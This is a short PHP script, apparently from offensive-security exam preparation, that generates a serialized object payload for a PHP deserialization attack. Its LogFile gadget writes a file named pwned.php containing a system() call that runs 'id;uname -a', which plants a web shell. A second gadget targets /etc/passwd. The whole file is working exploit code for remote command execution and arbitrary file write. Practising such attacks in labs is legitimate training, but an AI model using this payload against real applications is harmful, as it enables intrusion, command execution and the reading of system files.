<?php

class LogFile
{
        public function __construct()
        {
                $this->filename = "/root/Desktop/awae-prep/php-unserialize/pwned.php";
                $this->username = '<?php system("id;uname -a"); ?>';
        }
}


class ReadFile
{
        public function __construct()
        {
                $this->filename = '/etc/passwd';
        }
}

class User
{
        public function __construct()
        {
                //$this->username = new LogFile();
                $this->username = 'sailay';
                $this->isAdmin = new LogFile();
        }
}

$obj = new User();
echo serialize($obj);
echo "\n";


?>
